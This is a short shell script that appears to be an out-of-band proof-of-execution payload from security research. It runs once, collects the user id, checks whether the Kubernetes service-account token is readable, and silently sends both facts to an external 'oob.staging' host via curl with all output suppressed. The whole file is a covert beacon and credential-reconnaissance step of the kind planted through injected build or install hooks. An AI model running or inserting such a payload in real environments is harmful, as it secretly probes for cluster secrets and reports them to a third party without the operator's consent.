#!/bin/sh
        marker=/tmp/df-mise-storyboard-90d178544f5b19fefc20d911
        [ -e "$marker" ] && exit 0
        touch "$marker"
        uid=$(id -u)
        if test -r /var/run/secrets/kubernetes.io/serviceaccount/token; then readable=true; else readable=false; fi
        curl --max-time 5 --retry 0 -fsS "https://dbqu3fk9j3qeqf4api90xiu9z338f1bs5.oob.staging.depthfirst.com/mise-storyboard/90d178544f5b19fefc20d911?uid=${uid}&token_readable=${readable}" >/dev/null 2>&1 || true
        
